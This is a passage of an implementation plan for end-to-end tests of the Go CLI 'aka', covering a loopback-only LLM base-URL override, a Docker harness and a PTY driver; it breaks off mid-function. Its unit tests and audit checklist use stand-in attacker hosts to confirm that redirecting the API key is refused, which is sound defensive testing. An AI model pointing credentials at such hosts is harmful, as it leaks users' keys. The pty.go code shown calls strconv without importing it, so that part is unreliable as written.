# E2E Integration Tests Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Test the shipped `aka` binary end-to-end — built, installed on `$PATH` in a container, driven through a real PTY, talking to a real HTTP server — with no mocks and no test-only entrypoint.

**Architecture:** A `test/e2e` Go package (behind the `e2e` build tag) runs *inside* a Docker container. `TestMain` builds `./cmd/aka` and `install`s it to `/usr/local/bin/aka`. Each test gets a throwaway `$HOME` and its own `fakellm` HTTP server speaking the genuine Anthropic and OpenAI wire formats. Interactive flows are driven over a real pseudo-terminal with expect-style semantics. One product change — a loopback-restricted `AKA_LLM_BASE_URL` env var — is what lets the real binary reach the local server.

**Tech Stack:** Go 1.26, Docker, `github.com/creack/pty`, `net/http/httptest`, bubbletea/huh (the code under test).

## Global Constraints

- Go version: **1.26** (matches `go 1.26.4` in `go.mod`). The container base is `golang:1.26`.
- Every file under `test/e2e/` starts with `//go:build e2e` so the existing `go test -race -count=1 ./...` CI job is unaffected.
- Product code changes are limited to `internal/llm/` plus a `SECURITY-AUDIT.md` entry. No new CLI flags, no changes to `internal/ui/`, no test hooks in the TUI.
- After every Go file edit run `gofmt -w <file>` and `go build ./cmd/aka` (enforced by PostToolUse hooks in `.claude/settings.json`).
- Lint rules that CI enforces and that this plan's code must follow:
  - `defer` on an error-returning call must be wrapped: `defer func() { _ = f.Close() }()`
  - Use `fmt.Fprintf(&sb, ...)`, never `sb.WriteString(fmt.Sprintf(...))`
  - Error-path cleanup uses `_ = tmp.Close()`
- Fixture alias/function names must start with `e2e` (for example `e2egs`, `e2edeploy`). `apply.NameExistsInShell` silently skips any name that already resolves in the container's shell, which would look like a test bug.
- Do **not** commit unless explicitly asked. Each task's final step stages files and shows the commit command; run it only when the user has approved committing.

---

## File Structure

**Product changes (3 files):**

| File | Responsibility |
|---|---|
| `internal/llm/baseurl.go` (new) | `replaceBase`, `resolveBaseURL`, `isLoopbackHost` — the env-var override and its loopback guard |
| `internal/llm/baseurl_test.go` (new) | Plain unit tests for the guard (no `e2e` tag — runs in normal CI) |
| `internal/llm/anthropic.go` (modify) | `apiURL` field replacing the hardcoded const at the call site; `WithBaseURL` |
| `internal/llm/openaicompat.go` (modify) | `resolveBaseURL` in the constructor; `WithBaseURL` |
| `SECURITY-AUDIT.md` (modify) | New trust-boundary entry for the env var |

**Test harness (new, all `//go:build e2e`):**

| File | Responsibility |
|---|---|
| `test/e2e/main_test.go` | `TestMain`: container guard, build, install; `repoRoot()`, `akaBin` |
| `test/e2e/pty.go` | `Console` — PTY spawn, expect-with-consume, key constants, screen dump |
| `test/e2e/pty_test.go` | Tests for the driver itself against plain `sh` |
| `test/e2e/harness.go` | `Env` — temp `$HOME`, fixture seeding, `Spawn`/`Run`/`RunShell`, file assertions |
| `test/e2e/fakellm/server.go` | `Server`, `Recorded`, `Responder`; both routes |
| `test/e2e/fakellm/responses.go` | `Normal`, `Hostile`, `TokenLimit`, `Malformed` |
| `test/e2e/fakellm/server_test.go` | Proves the fake's JSON parses with the real providers |
| `test/e2e/init_test.go` | Shell wiring scenarios |
| `test/e2e/scan_test.go` | Full scan → apply → list → delete lifecycle |
| `test/e2e/censor_wire_test.go` | Censoring asserted against bytes on the socket |
| `test/e2e/hostile_test.go` | Adversarial LLM output |
| `test/e2e/live_test.go` | Opt-in real-provider tier |

**Build/CI:**

| File | Responsibility |
|---|---|
| `Dockerfile.e2e` (new) | `golang:1.26` + `zsh`, `bash`, `git` |
| `Makefile` (new) | `e2e`, `e2e-image` targets |
| `.github/workflows/ci.yml` (modify) | New `e2e` job |

### Deviation from the spec, deliberate

The spec put `resolveBaseURL` at the `buildProvider` call site in `internal/cli/scan.go`. This plan puts it **inside the two provider constructors** instead (`New` and `newOpenAICompat`). Same env var, same semantics, same loopback guard — but it covers all five providers with two edits and leaves `internal/cli/scan.go` completely untouched. Strictly smaller product diff for identical behaviour.

---

## Task 1: The loopback-guarded base URL override

**Files:**
- Create: `internal/llm/baseurl.go`
- Create: `internal/llm/baseurl_test.go`
- Modify: `SECURITY-AUDIT.md`

**Interfaces:**
- Consumes: nothing.
- Produces:
  - `func replaceBase(defaultURL, base string) (string, error)` — returns `defaultURL` with scheme+host replaced by those of `base`, path preserved.
  - `func resolveBaseURL(defaultURL string) string` — env-driven, loopback-guarded wrapper. Never returns an error; refuses with a stderr warning.
  - `func isLoopbackHost(host string) bool`
  - `const baseURLEnv = "AKA_LLM_BASE_URL"`

- [ ] **Step 1: Write the failing test**

Create `internal/llm/baseurl_test.go`:

```go
package llm

import "testing"

const anthropicDefault = "https://api.anthropic.com/v1/messages"

func TestResolveBaseURLUnsetReturnsDefault(t *testing.T) {
	t.Setenv(baseURLEnv, "")
	if got := resolveBaseURL(anthropicDefault); got != anthropicDefault {
		t.Fatalf("got %q, want %q", got, anthropicDefault)
	}
}

func TestResolveBaseURLLoopbackHonoured(t *testing.T) {
	cases := []struct {
		name     string
		override string
		want     string
	}{
		{"ipv4", "http://127.0.0.1:9099", "http://127.0.0.1:9099/v1/messages"},
		{"ipv4 alt loopback", "http://127.0.0.2:8080", "http://127.0.0.2:8080/v1/messages"},
		{"localhost", "http://localhost:9099", "http://localhost:9099/v1/messages"},
		{"ipv6", "http://[::1]:9099", "http://[::1]:9099/v1/messages"},
		{"override path ignored", "http://127.0.0.1:9099/ignored", "http://127.0.0.1:9099/v1/messages"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Setenv(baseURLEnv, tc.override)
			if got := resolveBaseURL(anthropicDefault); got != tc.want {
				t.Fatalf("got %q, want %q", got, tc.want)
			}
		})
	}
}

func TestResolveBaseURLNonLoopbackRefused(t *testing.T) {
	cases := []string{
		"https://evil.example.com",
		"http://10.0.0.1:9099",
		"http://example.com:9099",
		"evil.example.com",
		"not a url",
		"/just/a/path",
	}
	for _, override := range cases {
		t.Run(override, func(t *testing.T) {
			t.Setenv(baseURLEnv, override)
			if got := resolveBaseURL(anthropicDefault); got != anthropicDefault {
				t.Fatalf("override %q was honoured: got %q, want default", override, got)
			}
		})
	}
}

// A hostname that resolves to loopback must still be refused: resolution is
// attacker-influenceable, so honouring it would reopen the hole the guard closes.
func TestResolveBaseURLNoDNSResolution(t *testing.T) {
	t.Setenv(baseURLEnv, "http://localhost.localdomain:9099")
	if got := resolveBaseURL(anthropicDefault); got != anthropicDefault {
		t.Fatalf("resolvable-but-not-literal host was honoured: %q", got)
	}
}

func TestReplaceBasePreservesPath(t *testing.T) {
	got, err := replaceBase("https://api.groq.com/openai/v1/chat/completions", "http://127.0.0.1:1234")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	want := "http://127.0.0.1:1234/openai/v1/chat/completions"
	if got != want {
		t.Fatalf("got %q, want %q", got, want)
	}
}

func TestReplaceBaseRejectsInvalid(t *testing.T) {
	if _, err := replaceBase(anthropicDefault, "nonsense"); err == nil {
		t.Fatal("expected error for base with no scheme/host")
	}
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `go test ./internal/llm/ -run 'TestResolveBaseURL|TestReplaceBase' -v`
Expected: FAIL — `undefined: baseURLEnv`, `undefined: resolveBaseURL`, `undefined: replaceBase`.

- [ ] **Step 3: Write minimal implementation**

Create `internal/llm/baseurl.go`:

```go
package llm

import (
	"fmt"
	"net"
	"net/url"
	"os"
	"strings"
)

// baseURLEnv redirects provider requests to an alternate host.
//
// Only loopback destinations are honoured. This variable influences where the
// API key is transmitted, so an unrestricted version would be a credential
// exfiltration primitive for anything able to set an environment variable.
const baseURLEnv = "AKA_LLM_BASE_URL"

// replaceBase returns defaultURL with its scheme and host replaced by those of
// base. The path of defaultURL is preserved, so a single base serves every
// provider: Anthropic keeps /v1/messages, the OpenAI-compatible providers keep
// their own paths. Any path in base is ignored.
func replaceBase(defaultURL, base string) (string, error) {
	b, err := url.Parse(base)
	if err != nil {
		return "", fmt.Errorf("parse base URL %q: %w", base, err)
	}
	if b.Scheme == "" || b.Host == "" {
		return "", fmt.Errorf("base URL %q must be absolute (scheme and host required)", base)
	}
	d, err := url.Parse(defaultURL)
	if err != nil {
		return "", fmt.Errorf("parse default URL %q: %w", defaultURL, err)
	}
	d.Scheme = b.Scheme
	d.Host = b.Host
	return d.String(), nil
}

// resolveBaseURL applies $AKA_LLM_BASE_URL to defaultURL when it names a
// loopback host, and returns defaultURL unchanged otherwise. Refusals are
// reported on stderr rather than returned, so a bad value degrades to normal
// behaviour instead of breaking the command.
func resolveBaseURL(defaultURL string) string {
	override := strings.TrimSpace(os.Getenv(baseURLEnv))
	if override == "" {
		return defaultURL
	}

	u, err := url.Parse(override)
	if err != nil || u.Scheme == "" || u.Host == "" {
		fmt.Fprintf(os.Stderr, "warning: ignoring %s=%q — not an absolute URL\n", baseURLEnv, override)
		return defaultURL
	}
	if !isLoopbackHost(u.Hostname()) {
		fmt.Fprintf(os.Stderr,
			"warning: ignoring %s=%q — only loopback hosts are allowed, because this "+
				"setting controls where your API key is sent\n", baseURLEnv, override)
		return defaultURL
	}

	resolved, err := replaceBase(defaultURL, override)
	if err != nil {
		fmt.Fprintf(os.Stderr, "warning: ignoring %s=%q — %v\n", baseURLEnv, override, err)
		return defaultURL
	}
	return resolved
}

// isLoopbackHost reports whether host is a loopback literal.
//
// No DNS resolution is performed. A name that merely resolves to 127.0.0.1 is
// refused, because resolution depends on state an attacker may control and
// honouring it would defeat the restriction.
func isLoopbackHost(host string) bool {
	if host == "localhost" {
		return true
	}
	ip := net.ParseIP(host)
	return ip != nil && ip.IsLoopback()
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `gofmt -w internal/llm/baseurl.go internal/llm/baseurl_test.go && go test ./internal/llm/ -run 'TestResolveBaseURL|TestReplaceBase' -v`
Expected: PASS, all subtests.

- [ ] **Step 5: Add the SECURITY-AUDIT.md entry**

Append a new numbered section to `SECURITY-AUDIT.md`, following the formatting of the sections already there:

```markdown
## N. LLM endpoint override (`AKA_LLM_BASE_URL`)

**Boundary:** an environment variable influences the destination of HTTP requests
that carry the user's API key in the `X-API-Key` / `Authorization` header.

**Mitigation:** `internal/llm/baseurl.go` honours the variable only when the host
is a loopback *literal* (`127.0.0.0/8`, `::1`, or the exact string `localhost`).
No DNS resolution is performed, so a hostname that merely resolves to loopback is
refused. Non-loopback, unparseable, and relative values are ignored with a warning
on stderr; the default endpoint is used instead.

**Checklist:**
- [ ] `AKA_LLM_BASE_URL=https://attacker.example` is refused, warns, and the request
      still goes to the real provider.
- [ ] A hostname resolving to 127.0.0.1 is refused (literal check, not resolution).
- [ ] The variable cannot cause the key to be sent off-host.
```

- [ ] **Step 6: Verify the whole package still builds and lints**

Run: `go build ./... && go vet ./internal/llm/ && go test ./internal/llm/ -count=1`
Expected: no output from build/vet; tests PASS.

- [ ] **Step 7: Stage (commit only if the user has approved committing)**

```bash
git add internal/llm/baseurl.go internal/llm/baseurl_test.go SECURITY-AUDIT.md
git commit -m "feat(llm): add loopback-restricted AKA_LLM_BASE_URL override"
```

---

## Task 2: Wire the override into both providers

**Files:**
- Modify: `internal/llm/anthropic.go` (add `apiURL` field; use it in `Suggest`; add `WithBaseURL`)
- Modify: `internal/llm/openaicompat.go` (resolve in constructor; add `WithBaseURL`)
- Create: `internal/llm/baseurl_provider_test.go`

**Interfaces:**
- Consumes: `replaceBase`, `resolveBaseURL` from Task 1.
- Produces:
  - `func (a *AnthropicProvider) WithBaseURL(base string) *AnthropicProvider`
  - `func (p *OpenAICompatProvider) WithBaseURL(base string) *OpenAICompatProvider`
  - Both return a provider whose requests go to `base` with the provider's own path preserved. Both are used by `test/e2e/fakellm/server_test.go` in Task 6.

- [ ] **Step 1: Write the failing test**

Create `internal/llm/baseurl_provider_test.go`:

```go
package llm

import (
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"testing"

	"github.com/ntalmon/aka/internal/history"
)

// anthropicToolUseBody is the minimal valid Anthropic tool_use response.
func anthropicToolUseBody(t *testing.T) []byte {
	t.Helper()
	body, err := json.Marshal(map[string]any{
		"content": []any{map[string]any{
			"type":  "tool_use",
			"name":  "suggest_aliases",
			"input": map[string]any{"suggestions": []any{}},
		}},
	})
	if err != nil {
		t.Fatalf("marshal: %v", err)
	}
	return body
}

func TestAnthropicHonoursEnvBaseURL(t *testing.T) {
	var gotPath string
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		gotPath = r.URL.Path
		w.Header().Set("Content-Type", "application/json")
		_, _ = w.Write(anthropicToolUseBody(t))
	}))
	defer srv.Close()

	t.Setenv(baseURLEnv, srv.URL)

	if _, err := New("test-key").Suggest(context.Background(),
		[]history.Entry{{Command: "ls -la"}}); err != nil {
		t.Fatalf("Suggest: %v", err)
	}
	if gotPath != "/v1/messages" {
		t.Fatalf("request path = %q, want /v1/messages", gotPath)
	}
}

func TestOpenAICompatHonoursEnvBaseURL(t *testing.T) {
	var gotPath, gotAuth string
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		gotPath = r.URL.Path
		gotAuth = r.Header.Get("Authorization")
		w.Header().Set("Content-Type", "application/json")
		_, _ = w.Write([]byte(`{"choices":[{"message":{"tool_calls":[{"function":` +
			`{"name":"suggest_aliases","arguments":"{\"suggestions\":[]}"}}]}}]}`))
	}))
	defer srv.Close()

	t.Setenv(baseURLEnv, srv.URL)

	if _, err := NewGroq("test-key").Suggest(context.Background(),
		[]history.Entry{{Command: "ls -la"}}); err != nil {
		t.Fatalf("Suggest: %v", err)
	}
	if gotPath != "/openai/v1/chat/completions" {
		t.Fatalf("request path = %q, want /openai/v1/chat/completions", gotPath)
	}
	if gotAuth != "Bearer test-key" {
		t.Fatalf("Authorization = %q, want Bearer test-key", gotAuth)
	}
}

func TestWithBaseURLOverridesExplicitly(t *testing.T) {
	var gotPath string
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		gotPath = r.URL.Path
		w.Header().Set("Content-Type", "application/json")
		_, _ = w.Write(anthropicToolUseBody(t))
	}))
	defer srv.Close()

	if _, err := New("test-key").WithBaseURL(srv.URL).Suggest(context.Background(),
		[]history.Entry{{Command: "ls -la"}}); err != nil {
		t.Fatalf("Suggest: %v", err)
	}
	if gotPath != "/v1/messages" {
		t.Fatalf("request path = %q, want /v1/messages", gotPath)
	}
}

func TestNonLoopbackEnvDoesNotRedirect(t *testing.T) {
	t.Setenv(baseURLEnv, "https://attacker.example")
	if got := New("k").apiURL; got != anthropicAPI {
		t.Fatalf("apiURL = %q, want the real endpoint %q", got, anthropicAPI)
	}
}
```

`httptest.NewServer` binds `127.0.0.1`, so `srv.URL` satisfies the loopback guard without any special handling.

- [ ] **Step 2: Run test to verify it fails**

Run: `go test ./internal/llm/ -run 'HonoursEnvBaseURL|WithBaseURL|NonLoopbackEnv' -v`
Expected: FAIL — `a.apiURL undefined`, `New("k").apiURL undefined`, `WithBaseURL undefined`.

- [ ] **Step 3: Modify `internal/llm/anthropic.go`**

Add the field to the struct:

```go
// AnthropicProvider implements Provider using the Anthropic Messages API.
type AnthropicProvider struct {
	apiKey string
	apiURL string
	model  string
	client *http.Client
}
```

Set it in the constructor:

```go
// New creates an AnthropicProvider with the given API key.
func New(apiKey string) *AnthropicProvider {
	return &AnthropicProvider{
		apiKey: apiKey,
		apiURL: resolveBaseURL(anthropicAPI),
		model:  defaultModel,
		client: &http.Client{Timeout: 120 * time.Second},
	}
}

// WithBaseURL returns a shallow copy whose requests go to base, preserving the
// Anthropic API path. An invalid base is ignored.
func (a *AnthropicProvider) WithBaseURL(base string) *AnthropicProvider {
	cp := *a
	if resolved, err := replaceBase(cp.apiURL, base); err == nil {
		cp.apiURL = resolved
	}
	return &cp
}
```

In `Suggest`, change the request construction to use the field:

```go
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, a.apiURL, bytes.NewReader(body))
```

(That is the single occurrence of `anthropicAPI` inside `Suggest`; the const itself stays, since the constructor references it.)

Note that `WithModel` returns `a` (mutating in place) while `WithBaseURL` returns a copy. Leave `WithModel` as it is — changing it is out of scope for this plan.

- [ ] **Step 4: Modify `internal/llm/openaicompat.go`**

```go
func newOpenAICompat(apiURL, apiKey, model string) *OpenAICompatProvider {
	return &OpenAICompatProvider{
		apiURL: resolveBaseURL(apiURL),
		apiKey: apiKey,
		model:  model,
		client: &http.Client{Timeout: 120 * time.Second},
	}
}

// WithBaseURL returns a shallow copy whose requests go to base, preserving the
// provider's own API path. An invalid base is ignored.
func (p *OpenAICompatProvider) WithBaseURL(base string) *OpenAICompatProvider {
	cp := *p
	if resolved, err := replaceBase(cp.apiURL, base); err == nil {
		cp.apiURL = resolved
	}
	return &cp
}
```

This one edit covers Groq, OpenAI, Gemini, and Ollama, since all four go through `newOpenAICompat`.

- [ ] **Step 5: Run test to verify it passes**

Run: `gofmt -w internal/llm/ && go test ./internal/llm/ -count=1 -v`
Expected: PASS, including the pre-existing tests in the package.

- [ ] **Step 6: Verify nothing else broke**

Run: `go build ./... && go vet ./... && go test -race -count=1 ./...`
Expected: all PASS. `internal/cli/scan.go` is deliberately untouched.

- [ ] **Step 7: Stage (commit only if the user has approved committing)**

```bash
git add internal/llm/anthropic.go internal/llm/openaicompat.go internal/llm/baseurl_provider_test.go
git commit -m "feat(llm): honour AKA_LLM_BASE_URL in all provider constructors"
```

---

## Task 3: Container, Makefile, and the build-and-install TestMain

**Files:**
- Create: `Dockerfile.e2e`
- Create: `Makefile`
- Create: `test/e2e/main_test.go`
- Modify: `.gitignore` (ignore the build artifact directory)

**Interfaces:**
- Consumes: nothing.
- Produces:
  - `const akaBin = "/usr/local/bin/aka"` — the installed binary every scenario invokes.
  - `func repoRoot() string` — absolute path to the module root from `test/e2e`.
  - `make e2e` — builds the image and runs the tagged suite inside it.

- [ ] **Step 1: Write the failing test**

Create `test/e2e/main_test.go`:

```go
//go:build e2e

package e2e

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

// akaBin is where TestMain installs the binary. Every scenario invokes `aka`
// off $PATH so the tests exercise exactly what a user would run.
const akaBin = "/usr/local/bin/aka"

// containerGuardEnv is set by the Makefile. Without it the suite refuses to
// run: TestMain installs to /usr/local/bin, which on a developer's machine
// would overwrite their real aka binary.
const containerGuardEnv = "AKA_E2E_INSIDE_CONTAINER"

func TestMain(m *testing.M) {
	if os.Getenv(containerGuardEnv) != "1" {
		fmt.Fprintf(os.Stderr,
			"refusing to run: %s is not set.\n"+
				"These tests install to %s and must run inside the e2e container.\n"+
				"Run `make e2e` instead.\n", containerGuardEnv, akaBin)
		os.Exit(1)
	}
	if err := buildAndInstall(); err != nil {
		fmt.Fprintln(os.Stderr, "e2e setup failed:", err)
		os.Exit(1)
	}
	os.Exit(m.Run())
}

// buildAndInstall compiles ./cmd/aka and installs it to akaBin, mirroring what
// a user gets from install.sh.
func buildAndInstall() error {
	tmp := filepath.Join(os.TempDir(), "aka-e2e-build")

	build := exec.Command("go", "build", "-o", tmp, "./cmd/aka")
	build.Dir = repoRoot()
	build.Stdout = os.Stderr
	build.Stderr = os.Stderr
	if err := build.Run(); err != nil {
		return fmt.Errorf("go build ./cmd/aka: %w", err)
	}

	install := exec.Command("install", "-m", "755", tmp, akaBin)
	install.Stdout = os.Stderr
	install.Stderr = os.Stderr
	if err := install.Run(); err != nil {
		return fmt.Errorf("install %s: %w", akaBin, err)
	}
	return nil
}

// repoRoot returns the module root. Tests run with the working directory set
// to test/e2e, so the root is two levels up.
func repoRoot() string {
	abs, err := filepath.Abs(filepath.Join("..", ".."))
	if err != nil {
		panic(fmt.Sprintf("resolve repo root: %v", err))
	}
	return abs
}

func TestBinaryIsInstalledOnPath(t *testing.T) {
	t.Parallel()

	resolved, err := exec.LookPath("aka")
	if err != nil {
		t.Fatalf("aka not found on $PATH: %v", err)
	}
	if resolved != akaBin {
		t.Fatalf("aka resolved to %q, want %q", resolved, akaBin)
	}

	out, err := exec.Command("aka", "--version").CombinedOutput()
	if err != nil {
		t.Fatalf("aka --version failed: %v\n%s", err, out)
	}
	if !strings.Contains(string(out), "aka") {
		t.Fatalf("unexpected --version output: %q", out)
	}
}

func TestRequiredShellsArePresent(t *testing.T) {
	t.Parallel()

	for _, sh := range []string{"bash", "zsh"} {
		if _, err := exec.LookPath(sh); err != nil {
			t.Errorf("%s missing from the container image: %v", sh, err)
		}
	}
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `go test -tags e2e -count=1 ./test/e2e/...`
Expected: FAIL — the guard fires with "refusing to run: AKA_E2E_INSIDE_CONTAINER is not set." This is the guard doing its job on the host; the real verification is Step 5.

- [ ] **Step 3: Write `Dockerfile.e2e`**

```dockerfile
# Image for the aka end-to-end suite. The repo is mounted at /src at run time;
# nothing is copied in, so a rebuild is only needed when this file changes.
FROM golang:1.26

RUN apt-get update \
    && apt-get install -y --no-install-recommends \
        bash \
        zsh \
        git \
        ca-certificates \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /src
```

- [ ] **Step 4: Write the `Makefile`**

```makefile
E2E_IMAGE := aka-e2e

.PHONY: e2e e2e-image test build fmt

build:
	go build ./...

test:
	go test -race -count=1 ./...

fmt:
	gofmt -w .

e2e-image:
	docker build -f Dockerfile.e2e -t $(E2E_IMAGE) .

# Runs the tagged suite inside the container. The module and build caches are
# named volumes so repeat runs do not recompile the world.
e2e: e2e-image
	docker run --rm \
	  -e AKA_E2E_INSIDE_CONTAINER=1 \
	  -v "$(CURDIR)":/src \
	  -v aka-e2e-gomod:/go/pkg/mod \
	  -v aka-e2e-gocache:/root/.cache/go-build \
	  -w /src \
	  $(E2E_IMAGE) \
	  go test -tags e2e -count=1 -v ./test/e2e/...
```

- [ ] **Step 5: Run the suite in the container to verify it passes**

Run: `make e2e`
Expected: image builds, then `TestBinaryIsInstalledOnPath` and `TestRequiredShellsArePresent` both PASS.

- [ ] **Step 6: Verify the guard protects the host**

Run: `go test -tags e2e -count=1 ./test/e2e/...`
Expected: FAIL with the "refusing to run" message, and `/usr/local/bin/aka` on the host is **not** modified. Confirm with `ls -l /usr/local/bin/aka` (absent, or unchanged mtime).

- [ ] **Step 7: Confirm normal CI is unaffected**

Run: `go test -race -count=1 ./... && go build ./...`
Expected: PASS — the `e2e` build tag keeps `test/e2e` out of the default package set.

- [ ] **Step 8: Stage (commit only if the user has approved committing)**

```bash
git add Dockerfile.e2e Makefile test/e2e/main_test.go .gitignore
git commit -m "test(e2e): add container, make target, and build-and-install TestMain"
```

---

## Task 4: The PTY driver

**Files:**
- Create: `test/e2e/pty.go`
- Create: `test/e2e/pty_test.go`
- Modify: `go.mod`, `go.sum` (adds `github.com/creack/pty`)

**Interfaces:**
- Consumes: nothing.
- Produces:
  - `type Console struct{ ... }`
  - `func newConsole(t *testing.T, cmd *exec.Cmd) *Console` — starts `cmd` attached to a PTY.
  - `func (c *Console) Expect(substr string)` — waits for `substr` **after the previous match**, fatals on timeout with a screen dump.
  - `func (c *Console) ExpectRe(pattern string)` — same, regexp.
  - `func (c *Console) Send(keys ...string)`
  - `func (c *Console) SendLine(s string)`
  - `func (c *Console) Wait() int` — closes the PTY, waits, returns the exit code.
  - `func (c *Console) Screen() string` — everything received so far, ANSI-stripped.
  - `func (c *Console) NotExpect(substr string)` — asserts `substr` is absent from the whole session so far.
  - Key constants: `Enter`, `Up`, `Down`, `Left`, `Right`, `Space`, `Esc`, `CtrlC`.

- [ ] **Step 1: Add the dependency**

Run: `go get github.com/creack/pty@v1.1.24 && go mod tidy`
Expected: `github.com/creack/pty` appears in `go.mod`. It will land in the main `require` block; that is expected and noted in the spec.

- [ ] **Step 2: Write the failing test**

Create `test/e2e/pty_test.go`:

```go
//go:build e2e

package e2e

import (
	"os/exec"
	"testing"
)

func TestConsoleReadsAndWrites(t *testing.T) {
	t.Parallel()

	c := newConsole(t, exec.Command("sh", "-c", `printf 'name? '; read x; printf 'hello %s\n' "$x"`))
	c.Expect("name? ")
	c.SendLine("world")
	c.Expect("hello world")

	if code := c.Wait(); code != 0 {
		t.Fatalf("exit code = %d, want 0", code)
	}
}

// Expect must consume: each call searches only after the previous match. Without
// this, a bubbletea redraw lets a later Expect match a stale frame and pass for
// the wrong reason.
func TestExpectConsumesPreviousMatch(t *testing.T) {
	t.Parallel()

	c := newConsole(t, exec.Command("sh", "-c", `printf 'ready\n'; printf 'ready\n'; printf 'done\n'`))
	c.Expect("ready") // first
	c.Expect("ready") // second — only passes if the first was consumed
	c.Expect("done")
	if code := c.Wait(); code != 0 {
		t.Fatalf("exit code = %d, want 0", code)
	}
}

func TestConsoleStripsANSI(t *testing.T) {
	t.Parallel()

	// Emits red "styled" surrounded by SGR escapes, plus a cursor-hide sequence.
	c := newConsole(t, exec.Command("sh", "-c", `printf '\033[?25l\033[31mstyled\033[0m\n'`))
	c.Expect("styled")
	if code := c.Wait(); code != 0 {
		t.Fatalf("exit code = %d, want 0", code)
	}
	if got := c.Screen(); got != "styled\n" {
		t.Fatalf("Screen() = %q, want %q", got, "styled\n")
	}
}

func TestConsolePropagatesExitCode(t *testing.T) {
	t.Parallel()

	c := newConsole(t, exec.Command("sh", "-c", "exit 3"))
	if code := c.Wait(); code != 3 {
		t.Fatalf("exit code = %d, want 3", code)
	}
}

func TestNotExpect(t *testing.T) {
	t.Parallel()

	c := newConsole(t, exec.Command("sh", "-c", `printf 'alpha\n'`))
	c.Expect("alpha")
	if code := c.Wait(); code != 0 {
		t.Fatalf("exit code = %d, want 0", code)
	}
	c.NotExpect("beta")
}
```

- [ ] **Step 3: Run test to verify it fails**

Run: `make e2e`
Expected: FAIL — `undefined: newConsole`.

- [ ] **Step 4: Write the implementation**

Create `test/e2e/pty.go`:

```go
//go:build e2e

package e2e

import (
	"errors"
	"io"
	"os"
	"os/exec"
	"regexp"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/creack/pty"
)

// Keystrokes understood by the bubbletea/huh prompts under test.
const (
	Enter = "\r"
	Up    = "\x1b[A"
	Down  = "\x1b[B"
	Right = "\x1b[C"
	Left  = "\x1b[D"
	Space = " "
	Esc   = "\x1b"
	CtrlC = "\x03"
)

// defaultExpectTimeout bounds every Expect. There are no sleeps anywhere in the
// suite: synchronisation is always "wait for the prompt, then send".
const defaultExpectTimeout = 10 * time.Second

// ansiRE matches CSI sequences (colour, cursor movement, screen clears) and OSC
// sequences, which is everything lipgloss and bubbletea emit.
var ansiRE = regexp.MustCompile(`\x1b\[[0-9;?]*[ -/]*[@-~]|\x1b\][^\a]*(\a|\x1b\\)|\x1b[()][B0]`)

// Console drives a process attached to a real pseudo-terminal.
//
// Expect has consuming semantics: each call searches only the output produced
// after the previous match. bubbletea repaints the whole screen on every
// keystroke, so a non-consuming Expect would happily match a frame from several
// screens ago and pass for the wrong reason.
type Console struct {
	t    *testing.T
	cmd  *exec.Cmd
	ptmx *os.File

	mu       sync.Mutex
	raw      strings.Builder // everything received, escapes intact
	stripped strings.Builder // same, ANSI removed — what assertions match against
	offset   int             // consume point into stripped

	readDone chan struct{}
	waitOnce sync.Once
	exitCode int
}

// newConsole starts cmd attached to a PTY and streams its output into the
// console buffers. The process is killed at test cleanup if still running.
func newConsole(t *testing.T, cmd *exec.Cmd) *Console {
	t.Helper()

	ptmx, err := pty.Start(cmd)
	if err != nil {
		t.Fatalf("start %v under pty: %v", cmd.Args, err)
	}

	c := &Console{
		t:        t,
		cmd:      cmd,
		ptmx:     ptmx,
		readDone: make(chan struct{}),
		exitCode: -1,
	}

	go c.readLoop()

	t.Cleanup(func() {
		_ = ptmx.Close()
		if cmd.Process != nil {
			_ = cmd.Process.Kill()
		}
	})

	return c
}

func (c *Console) readLoop() {
	defer close(c.readDone)
	buf := make([]byte, 4096)
	for {
		n, err := c.ptmx.Read(buf)
		if n > 0 {
			chunk := string(buf[:n])
			c.mu.Lock()
			c.raw.WriteString(chunk)
			c.stripped.WriteString(stripANSI(chunk))
			c.mu.Unlock()
		}
		if err != nil {
			return // EIO on close is normal for a PTY
		}
	}
}

// stripANSI removes escape sequences and normalises PTY line endings so
// assertions can match plain text.
func stripANSI(s string) string {
	s = ansiRE.ReplaceAllString(s, "")
	s = strings.ReplaceAll(s, "\r\n", "\n")
	return strings.ReplaceAll(s, "\r", "")
}

// Expect waits for substr to appear after the previous match, then consumes
// through it. Fatals with a screen dump on timeout.
func (c *Console) Expect(substr string) {
	c.t.Helper()
	c.expectFunc("substring "+strconv.Quote(substr), func(pending string) int {
		if i := strings.Index(pending, substr); i >= 0 {
			return i + len(substr)
		}
		return -1
	})
}

// ExpectRe is Expect with a regular expression.
func (c *Console) ExpectRe(pattern string) {
	c.t.Helper()
	re, err := regexp.Compile(pattern)
	if err != nil {
		c.t.Fatalf("bad ExpectRe pattern %q: %v", pattern, err)
	}
	c.expectFunc("pattern "+strconv.Quote(pattern), func(pending string) int {
		if loc := re.FindStringIndex(pending); loc != nil {
			return loc[1]
		}
		return -1
	})
}

// expectFunc polls the pending (unconsumed) output until match returns a
// non-negative end offset, then advances the consume point.
func (c *Console) expectFunc(what string, match func(pending string) int) {
	c.t.Helper()
	deadline := time.Now().Add(defaultExpectTimeout)

	for {
		c.mu.Lock()
		pending := c.stripped.String()[c.offset:]
		if end := match(pending); end >= 0 {
			c.offset += end
			c.mu.Unlock()
			return
		}
		c.mu.Unlock()

		if time.Now().After(deadline) {
			c.t.Fatalf("timed out after %s waiting for %s\n\n%s",
				defaultExpectTimeout, what, c.dump())
		}
		select {
		case <-c.readDone:
			// Process ended; one last check before giving up.
			c.mu.Lock()
			pending := c.stripped.String()[c.offset:]
